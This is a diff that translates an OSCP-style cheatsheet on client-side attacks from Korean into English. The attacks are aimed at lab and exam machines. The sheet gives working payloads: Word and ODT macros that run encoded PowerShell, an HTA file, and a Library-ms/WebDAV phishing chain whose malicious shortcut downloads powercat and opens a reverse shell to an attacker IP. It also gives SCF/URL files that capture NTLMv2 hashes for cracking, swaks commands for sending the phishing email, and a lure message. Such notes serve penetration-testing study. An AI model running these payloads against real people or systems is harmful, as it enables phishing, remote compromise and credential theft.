@@ -1,18 +1,18 @@
 ---
-title: "클라이언트 사이드 공격 (Client-Side Attacks)"
+title: "Client-Side Attacks"
 date: 2026-06-20
 weight: 130
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "메일, 파일 업로드, 웹 경로로 사용자를 직접 노려 초기 발판을 만드는 공격 모음."
+summary: "Collection of attacks that target the user directly through email, file uploads, and web paths to establish an initial foothold."
 ---
 
-메일·파일 업로드·웹 경로로 사용자를 직접 노려 초기 발판을 만드는 공격 모음.
+Collection of attacks that target the user directly through email, file uploads, and web paths to establish an initial foothold.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/client-side-attacks/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/client-side-attacks/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 
-## 공격 선택 의사결정 트리
+## Attack Selection Decision Tree
 
 ```text
 Can you send email to target?
@@ -25,19 +25,19 @@ Can you send email to target?
         └── YES → HTA file hosted on your server
 ```
 
-- 시험은 assumed-breach 형식이라 클라이언트 사이드 출현 빈도는 낮다. standalone 박스용으로 알아둔다.
+- The exam is assumed-breach format, so client-side attacks rarely appear. Learn them for standalone boxes.
 
-## 상황별 공격 선택표
+## Attack Selection Table by Situation
 
-- SMTP + 이메일 발송 가능 + Windows 박스 보유 → Library-ms + .lnk (작성: 텍스트 에디터 + Windows GUI, 전달: swaks)
-- SMTP + 이메일 발송 가능 (Windows 없음) → Word 매크로 .doc (작성: LibreOffice, 전달: swaks)
-- 웹 업로드 폼 → ODT 매크로 (작성: LibreOffice GUI, 전달: 업로드 폼)
-- 쓰기 가능 SMB 공유 → SCF/URL 파일 (작성: 텍스트 에디터, 전달: 공유에 드롭 + Responder)
-- 피해자가 내 URL 방문 → HTA 파일 (작성: 텍스트 에디터, 전달: python3 http.server)
+- SMTP + can send email + have a Windows box → Library-ms + .lnk (build: text editor + Windows GUI, deliver: swaks)
+- SMTP + can send email (no Windows) → Word macro .doc (build: LibreOffice, deliver: swaks)
+- Web upload form → ODT macro (build: LibreOffice GUI, deliver: upload form)
+- Writable SMB share → SCF/URL file (build: text editor, deliver: drop on the share + Responder)
+- Victim visits your URL → HTA file (build: text editor, deliver: python3 http.server)
 
-## Word VBA 매크로 공격
+## Word VBA Macro Attack
 
-### Step 1 — 인코딩된 리버스 셸 생성
+### Step 1 — Generate an encoded reverse shell
 
 ```bash
 # Encode PowerShell payload (UTF-16LE + Base64 — required for -enc flag)
@@ -48,7 +48,7 @@ print(base64.b64encode(cmd.encode('utf-16-le')).decode())
 " "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER/powercat.ps1');powercat -c ATTACKER -p 443 -e powershell"
 ```
 
-### Step 2 — Word에서 매크로 생성
+### Step 2 — Create the macro in Word
 
 View → Macros → Create:
 
@@ -70,9 +70,9 @@ Sub MyMacro()
 End Sub
 ```
 
-- 저장은 반드시 .doc (Word 97-2003)로. .docx는 매크로가 유지되지 않는다.
+- Always save as .doc (Word 97-2003). Macros are not preserved in .docx.
 
-base64를 VBA에 안전한 50자 청크로 잘라주는 스크립트:
+Script that splits base64 into 50-character chunks safe for VBA:
 
 ```python
 import sys
@@ -84,10 +84,10 @@ for i in range(0, len(str), n):
 
 ```bash
 # Usage: python3 split.py <BASE64_STRING>
-# 출력을 매크로의 Str = "powershell..." 줄과 CreateObject 사이에 붙여넣는다
+# Paste the output between the macro's Str = "powershell..." line and CreateObject
 ```
 
-### Step 3 — 전달
+### Step 3 — Delivery
 
 ```bash
 # Host PowerCat
@@ -98,11 +98,11 @@ python3 -m http.server 80
 nc -nlvp 443
 ```
 
-## Windows 라이브러리 파일 공격 (.library-ms)
+## Windows Library File Attack (.library-ms)
 
-WebDAV 서버를 가리키는 가짜 라이브러리를 만든다. 피해자가 열면 탐색기가 내 WebDAV에 연결하고, 그 안의 악성 .lnk 바로가기가 보인다.
+Create a fake library that points at a WebDAV server. When the victim opens it, Explorer connects to your WebDAV, and the malicious .lnk shortcut inside becomes visible.
 
-### Step 1 — WebDAV 서버
+### Step 1 — WebDAV server
 
 ```bash
 pip3 install wsgidav
@@ -110,9 +110,9 @@ mkdir ~/webdav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
 ```
 
-### Step 2 — 라이브러리 파일 생성
+### Step 2 — Create the library file
 
-config.Library-ms로 저장:
+Save as config.Library-ms:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -136,17 +136,17 @@ config.Library-ms로 저장:
 </libraryDescription>
 ```
 
-### Step 3 — 악성 바로가기 (.lnk) 생성
+### Step 3 — Create the malicious shortcut (.lnk)
 
-Windows(RDP)에서 데스크톱 우클릭 > New > Shortcut. 아래는 짧은 powercat 대상 (이유는 뒤의 전체 체인 섹션 참고):
+On Windows (RDP), right-click the desktop > New > Shortcut. Below is the short powercat target (see the full chain section later for why):
 
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8000/powercat.ps1'); powercat -c $KALI -p 4445 -e powershell"
 ```
 
-### Step 4 — 이메일로 전달
+### Step 4 — Deliver by email
 
-swaks는 SMTP 만능칼. 명령줄에서 이메일을 보낸다.
+swaks is the SMTP multi-tool. It sends email from the command line.
 
 ```bash
 # FIRST — test if email delivers (no attachment, just a test)
@@ -174,16 +174,16 @@ sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body
 sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
 ```
 
-SMTP creds를 알아보는 법:
+How to find SMTP creds:
 
-- "email configuration", "smtp", "mail server" 같은 단어가 든 config 파일에서 발견된다.
-- "contact" 또는 "responsible"로 표기된 사람은 발송자가 아니라 피싱 대상이다.
+- Found in config files containing words like "email configuration", "smtp", "mail server".
+- A person listed as "contact" or "responsible" is the phishing target, not the sender.
 
-## LibreOffice ODT 매크로 공격
+## LibreOffice ODT Macro Attack
 
-Word 매크로와 같은 개념의 ODT 문서 버전. 업로드 폼이 ODT/문서 파일을 받고 서버가 자동으로 "검토"하거나 처리할 때 사용한다.
+The ODT document version of the same concept as the Word macro. Use it when an upload form accepts ODT/document files and the server automatically "reviews" or processes them.
 
-단계별 진행:
+Step-by-step:
 
 ```bash
 # 1. Create reverse shell script on Kali
@@ -195,12 +195,12 @@ EOF
 libreoffice --writer
 ```
 
-LibreOffice 안에서:
+Inside LibreOffice:
 
-- 가짜 내용 입력 후 File → Save As → resume.odt (반드시 먼저 저장)
+- Enter fake content, then File → Save As → resume.odt (must save first)
 - Tools → Macros → Edit Macros
-- 왼쪽 패널에서 resume.odt 확장 → Standard → Module1 ("My Macros" 아님)
-- 매크로 붙여넣기:
+- In the left panel, expand resume.odt → Standard → Module1 (not "My Macros")
+- Paste the macro:
 
 ```basic
 Sub Main
@@ -208,13 +208,13 @@ Sub Main
 End Sub
 ```
 
-- Ctrl+S로 저장
-- Tools → Customize → Events 탭
-- "Save in:" 드롭다운을 resume.odt로 변경 (LibreOffice 아님)
-- Open Document 선택 → Macro... 클릭 → resume.odt → Standard → Module1 → Main
-- OK → OK → Ctrl+S 다시
+- Save with Ctrl+S
+- Tools → Customize → Events tab
+- Change the "Save in:" dropdown to resume.odt (not LibreOffice)
+- Select Open Document → click Macro... → resume.odt → Standard → Module1 → Main
+- OK → OK → Ctrl+S again
 
-배치(배포):
+Deploy (deliver):
 
 ```bash
 # Terminal 1: serve shell.ps1
@@ -226,9 +226,9 @@ rlwrap nc -lvnp 4444
 # Upload resume.odt through web form
 ```
 
-순서가 틀리면 실패한다: 문서 저장 → 문서에 매크로 추가 → 저장 → "Save in: resume.odt"로 이벤트 트리거 설정 → 저장.
+The order matters or it fails: save the document → add the macro to the document → save → set the event trigger with "Save in: resume.odt" → save.
 
-## HTA (HTML Application) 공격
+## HTA (HTML Application) Attack
 
 ```html
 <html>
@@ -246,13 +246,13 @@ python3 -m http.server 80
 # Victim visits: http://ATTACKER/evil.hta → browser prompts to open → shell
 ```
 
-- msfvenom -f hta-pse는 Metasploit 사용 1회로 counting된다. 수동 HTA를 선호한다.
+- msfvenom -f hta-pse counts as one Metasploit use. Prefer a manual HTA.
 
-## 쓰기 가능 공유를 통한 강제 인증 (Forced Authentication)
+## Forced Authentication via Writable Share
 
-쓰기 가능 SMB 공유에 아래 파일을 드롭한다. 사용자가 공유를 탐색하면 Windows가 내 서버에서 아이콘을 자동 로드 → NTLMv2 해시가 날아온다.
+Drop the files below onto a writable SMB share. When a user browses the share, Windows automatically loads the icon from your server → the NTLMv2 hash comes to you.
 
-### SCF 파일 (@inventory.scf로 저장 — @가 목록 맨 위로 정렬)
+### SCF file (save as @inventory.scf — the @ sorts it to the top of the list)
 
 ```ini
 [Shell]
@@ -262,7 +262,7 @@ IconFile=\\ATTACKER_IP\share\icon.ico
 Command=ToggleDesktop
 ```
 
-### URL 파일
+### URL file
 
 ```ini
 [InternetShortcut]
@@ -271,7 +271,7 @@ IconIndex=0
 IconFile=\\ATTACKER_IP\share\icon.ico
 ```
 
-### 해시 캡처
+### Capturing the hash
 
 ```bash
 sudo responder -I tun0 -v -A    # ANALYZE mode on exam!
@@ -279,19 +279,19 @@ sudo responder -I tun0 -v -A    # ANALYZE mode on exam!
 impacket-smbserver share . -smb2support
 ```
 
-### 캡처한 NTLMv2 해시 크랙
+### Cracking the captured NTLMv2 hash
 
-Responder가 출력하는 [SMB] NTLMv2-SSP Hash 줄 전체를 파일로 저장해 크랙한다 (NTLMv2는 패스할 수 없고 반드시 크랙해야 한다):
+Save the entire [SMB] NTLMv2-SSP Hash line that Responder prints to a file and crack it (NTLMv2 cannot be passed, it must be cracked):
 
 ```bash
 hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
 ```
 
-- 자세한 모드 번호 → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)
+- For mode numbers in detail → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)
 
-## 페이로드 인코딩 빠른 참조
+## Payload Encoding Quick Reference
 
-PowerShell은 Base64 전에 UTF-16LE 인코딩이 필요하다:
+PowerShell requires UTF-16LE encoding before Base64:
 
 ```bash
 # Python one-liner
@@ -305,11 +305,11 @@ print(base64.b64encode(cmd.encode('utf-16-le')).decode())
 powershell.exe -nop -w hidden -enc <OUTPUT>
 ```
 
-## Windows 라이브러리 + WebDAV 피싱 (전체 체인)
+## Windows Library + WebDAV Phishing (full chain)
 
-사용 시점: 유효한 도메인 creds + SMTP 접근은 있지만 셸 접근은 없을 때 (WinRM/RDP/admin 없음). .Library-ms 첨부 피싱 메일을 보내고, 피해자가 열면 탐색기가 내 WebDAV에 연결, 그 안의 악성 .lnk 클릭으로 리버스 셸.
+When to use: you have valid domain creds + SMTP access but no shell access (no WinRM/RDP/admin). Send a phishing email with a .Library-ms attachment; when the victim opens it, Explorer connects to your WebDAV, and clicking the malicious .lnk inside gives a reverse shell.
 
-### 체인 흐름
+### Chain flow
 
 ```text
 Email with .Library-ms attachment
@@ -322,7 +322,7 @@ Email with .Library-ms attachment
   -> You have a shell on the victims internal workstation
 ```
 
-### Step 1: Kali에서 WebDAV 서버 (80 포트)
+### Step 1: WebDAV server on Kali (port 80)
 
 ```bash
 pip install wsgidav
@@ -330,9 +330,9 @@ mkdir -p ~/webdav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
 ```
 
-### Step 2: .Library-ms 파일 생성
+### Step 2: Create the .Library-ms file
 
-도구: 아무 텍스트 에디터 (Kali의 nano면 충분). 그냥 XML이다. .Library-ms 확장자로 저장. 파일명 config.Library-ms:
+Tool: any text editor (nano on Kali is enough). It is just XML. Save with the .Library-ms extension. Filename config.Library-ms:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -356,22 +356,22 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
 </libraryDescription>
 ```
 
-- 이 파일은 작업 디렉터리에 저장한다 (webdav 폴더 아님). 이메일 첨부로 발송되는 파일이고 WebDAV가 서빙하지 않는다.
+- Save this file in your working directory (not the webdav folder). It is the file sent as an email attachment and is not served by WebDAV.
 
-### Step 3: 악성 바로가기 (.lnk) 생성
+### Step 3: Create the malicious shortcut (.lnk)
 
-- 도구: Windows 전용 GUI. Linux에서는 .lnk를 만들 수 없다. RDP로 접속해 데스크톱 우클릭 > New > Shortcut.
-- 주의: Windows 바로가기 대상에는 약 260자 제한이 있다. Base64 인코딩 페이로드는 잘려서 조용히 실패한다.
-- 필드에 들어가는 "짧은" powercat 버전 사용:
+- Tool: Windows-only GUI. You cannot create a .lnk on Linux. Connect over RDP, right-click the desktop > New > Shortcut.
+- Warning: Windows shortcut targets have a limit of about 260 characters. Base64-encoded payloads get truncated and fail silently.
+- Use the "short" powercat version that goes in the field:
 
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8000/powercat.ps1'); powercat -c KALI_IP -p 4444 -e powershell"
 ```
 
-- 긴 base64 문자열에 -enc를 쓰지 않는다 — 잘리고 에러 없이 아무 일도 일어나지 않는다.
-- 이름은 install로 짓는다. .lnk를 ~/webdav/ (WebDAV 루트)로 옮긴다.
+- Do not use -enc with a long base64 string — it gets truncated and nothing happens, with no error.
+- Name it install. Move the .lnk to ~/webdav/ (the WebDAV root).
 
-### Step 4: PowerCat 서빙 (8000 포트)
+### Step 4: Serve PowerCat (port 8000)
 
 ```bash
 # Find powercat (path varies by Kali version)
@@ -383,15 +383,15 @@ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powe
 python3 -m http.server 8000
 ```
 
-### Step 5: 리스너 시작 (4444 포트)
+### Step 5: Start the listener (port 4444)
 
 ```bash
 nc -nvlp 4444
 ```
 
-### Step 6: 피싱 이메일 발송 (Kali에서)
+### Step 6: Send the phishing email (from Kali)
 
-swaks 플래그 전체 참조는 위의 이메일 전달 섹션 참고. 한 줄 버전:
+See the email delivery section above for the full swaks flag reference. One-line version:
 
 ```bash
 # Without auth (open relay)
@@ -401,7 +401,7 @@ sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Librar
 sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
 ```
 
-body.txt 예시:
+body.txt example:
 
 ```text
 Hey!
@@ -410,35 +410,35 @@ Download the attached file, double-click on it, and execute
 the configuration shortcut within. Thanks!
 ```
 
-### 동시에 돌아가는 터미널 4개
+### Four terminals running at the same time
 
-- 터미널 1: wsgidav (WebDAV), 80 포트 — .lnk 호스팅 (피해자가 여기를 탐색)
-- 터미널 2: python3 HTTP, 8000 포트 — powercat.ps1 서빙
-- 터미널 3: nc 리스너, 4444 포트 — 리버스 셸 수신
-- 터미널 4: swaks — 피싱 이메일 발송
+- Terminal 1: wsgidav (WebDAV), port 80 — hosts the .lnk (the victim browses here)
+- Terminal 2: python3 HTTP, port 8000 — serves powercat.ps1
+- Terminal 3: nc listener, port 4444 — receives the reverse shell
+- Terminal 4: swaks — sends the phishing email
 
-### 파일 배치 (압박 상황에서 헷갈리기 쉬움)
+### File placement (easy to confuse under pressure)
 
-- config.Library-ms — 작성: Kali 텍스트 에디터 (그냥 XML) — 전달: swaks 첨부로 이메일 발송 — 피해자가 탐색기에서 열람
-- powercat.ps1 — 작성: Kali에서 /usr/share/powershell-empire/... 에서 복사 — 전달: python3 http.server :8000이 서빙 — .lnk가 자동 다운로드
+- config.Library-ms — build: Kali text editor (just XML) — deliver: emailed as a swaks attachment — the victim opens it in Explorer
+- powercat.ps1 — build: copy from /usr/share/powershell-empire/... on Kali — deliver: served by python3 http.server :8000 — the .lnk downloads it automatically
 
-### 핵심 포인트
+### Key points
 
-- .Library-ms = 이메일 첨부 (webdav 폴더에 넣지 않는다)
-- .lnk = webdav 폴더 안 (피해자가 라이브러리 파일을 연 뒤 보게 됨)
-- WebDAV는 80 포트여야 한다 (Windows 탐색기가 요구)
-- 라이브러리 파일의 URL = Kali IP, 뒤에 경로 없이
-- swaks -ap = 메일 서버 패스워드 인증
-- 셸 확보 후: winPEAS 업로드, SharpHound 실행, 피벗팅용 Meterpreter+SOCKS 셋업
+- .Library-ms = email attachment (do not put it in the webdav folder)
+- .lnk = inside the webdav folder (the victim sees it after opening the library file)
+- WebDAV must be on port 80 (Windows Explorer requires it)
+- The library file URL = Kali IP, with no path after it
+- swaks -ap = mail server password authentication
+- After getting a shell: upload winPEAS, run SharpHound, set up Meterpreter+SOCKS for pivoting
 
-### 문제 해결 (피싱이 안 될 때)
+### Troubleshooting (when phishing does not work)
 
-- swaks가 전달했는가 — 출력에서 "250 OK" 또는 "250 Queued" 확인. 에러가 보이면 메일이 발송되지 않은 것이다.
-- 먼저 -ap 없이 시도 — 실습 메일 서버 상당수는 오픈 릴레이. -ap는 불필요한 인증을 강제할 수 있다.
-- WebDAV 연결이 없다 — Library-ms의 URL이 틀렸거나 메일이 안 열린 것이다. XML 안의 URL이 Kali IP와 정확히 일치하는지 확인.
-- WebDAV는 연결되는데 셸이 없다 — .lnk 페이로드가 깨진 것이다. powercat 명령 확인, 리스너와 포트 일치 확인.
-- 이메일 형식 전부 시도 — firstname@domain.com, f.lastname@domain.com, first.last@domain.com
-- 모든 직원에게 발송 — 한 명만 찾지 말고 발견한 이름 전부에게.
-- 1-2분 기다린다 — 시뮬레이션 유저는 즉시 클릭하지 않는다.
-- config.Library-ms는 swaks 첨부로 보내고 webdav 폴더에 넣지 않는다.
-- 25 포트(특권 포트)로 보내면 swaks에 sudo 사용.
+- Did swaks deliver it — check the output for "250 OK" or "250 Queued". If you see an error, the mail was not sent.
+- Try without -ap first — many lab mail servers are open relays. -ap may force unnecessary authentication.
+- No WebDAV connection — the URL in the Library-ms is wrong or the mail was not opened. Check that the URL in the XML exactly matches the Kali IP.
+- WebDAV connects but no shell — the .lnk payload is broken. Check the powercat command and that the listener and port match.
+- Try every email format — firstname@domain.com, f.lastname@domain.com, first.last@domain.com
+- Send to every employee — do not look for just one person, send to every name you found.
+- Wait 1-2 minutes — simulated users do not click immediately.
+- Send config.Library-ms as a swaks attachment, do not put it in the webdav folder.
+- If sending on port 25 (privileged port), use sudo for swaks.
